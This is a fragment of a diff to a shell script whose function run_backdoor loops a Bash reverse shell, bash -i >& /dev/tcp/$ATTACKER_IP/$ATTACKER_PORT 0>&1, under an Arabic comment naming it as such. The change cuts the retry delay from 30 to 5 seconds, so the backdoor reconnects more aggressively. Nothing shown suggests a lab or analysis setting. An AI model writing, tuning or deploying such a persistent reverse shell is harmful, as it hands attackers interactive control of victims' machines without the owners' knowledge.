@@ -10,7 +10,7 @@ run_backdoor() {
         # محاولة الاتصال (Bash Reverse Shell)
         bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
         
-        sleep 30
+        sleep 5
     done
 }
 
